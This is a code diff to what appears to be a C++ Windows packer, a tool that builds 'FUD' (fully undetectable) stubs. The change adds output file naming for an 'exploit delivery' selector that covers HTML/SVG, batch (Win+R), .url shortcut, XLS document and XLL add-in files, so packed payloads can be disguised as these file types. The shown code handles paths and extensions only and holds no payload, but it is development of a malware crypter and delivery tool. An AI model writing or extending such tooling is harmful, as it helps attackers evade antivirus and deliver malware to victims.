@@ -2780,9 +2780,34 @@ static void createFUDStubOnly() {
     (void)outputBuffer; // Suppress unused variable warning
     
     if (outputPath.empty()) {
-        // Auto-generate output path
+        // Auto-generate output path based on mode
         std::string randomName = g_packer.randomEngine.generateRandomName();
-        outputPath = "FUD_Stub_" + randomName + ".exe";
+        
+        // Get selected exploit method to determine appropriate file extension
+        int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
+        ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+        
+        switch (exploitType) {
+            case EXPLOIT_HTML_SVG:
+                outputPath = randomName + ".html";
+                break;
+            case EXPLOIT_WIN_R:
+                outputPath = randomName + ".bat";
+                break;
+            case EXPLOIT_INK_URL:
+                outputPath = randomName + ".url";
+                break;
+            case EXPLOIT_DOC_XLS:
+                outputPath = randomName + ".xls";
+                break;
+            case EXPLOIT_XLL:
+                outputPath = randomName + ".xll";
+                break;
+            case EXPLOIT_NONE:
+            default:
+                outputPath = "FUD_Stub_" + randomName + ".exe";
+                break;
+        }
         
         // Update the GUI with the auto-generated path
         std::wstring wOutputPath(outputPath.begin(), outputPath.end());
@@ -2790,8 +2815,16 @@ static void createFUDStubOnly() {
         
         entryLog << "Auto-generated output path: " << outputPath << "\n";
     } else {
-        // Ensure output path has .exe extension
-        if (outputPath.length() < 4 || outputPath.substr(outputPath.length() - 4) != ".exe") {
+        // Only force .exe extension for actual executables, not exploit files
+        bool isExploitFile = (outputPath.find(".html") != std::string::npos ||
+                             outputPath.find(".bat") != std::string::npos ||
+                             outputPath.find(".url") != std::string::npos ||
+                             outputPath.find(".lnk") != std::string::npos ||
+                             outputPath.find(".xls") != std::string::npos ||
+                             outputPath.find(".docx") != std::string::npos ||
+                             outputPath.find(".xll") != std::string::npos);
+        
+        if (!isExploitFile && (outputPath.length() < 4 || outputPath.substr(outputPath.length() - 4) != ".exe")) {
             outputPath += ".exe";
             std::wstring wOutputPath(outputPath.begin(), outputPath.end());
             SetWindowTextW(g_hOutputPath, wOutputPath.c_str());
@@ -2860,12 +2893,37 @@ static void createFUDExecutable() {
         return;
     }
     
-    // Ensure output path always has .exe extension
+    // Auto-generate output path based on mode and exploit type
     if (outputPath.empty()) {
         // Auto-generate output path based on input file location and random name
         std::string inputDir = inputPath.substr(0, inputPath.find_last_of("\\/"));
         std::string randomName = g_packer.randomEngine.generateRandomName();
-        outputPath = inputDir + "\\FUD_" + randomName + ".exe";
+        
+        // Get selected exploit method to determine appropriate file extension
+        int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
+        ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+        
+        switch (exploitType) {
+            case EXPLOIT_HTML_SVG:
+                outputPath = inputDir + "\\" + randomName + ".html";
+                break;
+            case EXPLOIT_WIN_R:
+                outputPath = inputDir + "\\" + randomName + ".bat";
+                break;
+            case EXPLOIT_INK_URL:
+                outputPath = inputDir + "\\" + randomName + ".url";
+                break;
+            case EXPLOIT_DOC_XLS:
+                outputPath = inputDir + "\\" + randomName + ".xls";
+                break;
+            case EXPLOIT_XLL:
+                outputPath = inputDir + "\\" + randomName + ".xll";
+                break;
+            case EXPLOIT_NONE:
+            default:
+                outputPath = inputDir + "\\FUD_" + randomName + ".exe";
+                break;
+        }
         
         // Update the GUI with the auto-generated path
         std::wstring wOutputPath(outputPath.begin(), outputPath.end());
@@ -2876,8 +2934,16 @@ static void createFUDExecutable() {
         entryLog << "Auto-generated output path: " << outputPath << "\n";
         entryLog.close();
     } else {
-        // Ensure manual output path has .exe extension
-        if (outputPath.length() < 4 || outputPath.substr(outputPath.length() - 4) != ".exe") {
+        // Only force .exe extension for actual executables, not exploit files
+        bool isExploitFile = (outputPath.find(".html") != std::string::npos ||
+                             outputPath.find(".bat") != std::string::npos ||
+                             outputPath.find(".url") != std::string::npos ||
+                             outputPath.find(".lnk") != std::string::npos ||
+                             outputPath.find(".xls") != std::string::npos ||
+                             outputPath.find(".docx") != std::string::npos ||
+                             outputPath.find(".xll") != std::string::npos);
+        
+        if (!isExploitFile && (outputPath.length() < 4 || outputPath.substr(outputPath.length() - 4) != ".exe")) {
             outputPath += ".exe";
             
             // Update the GUI with the corrected path
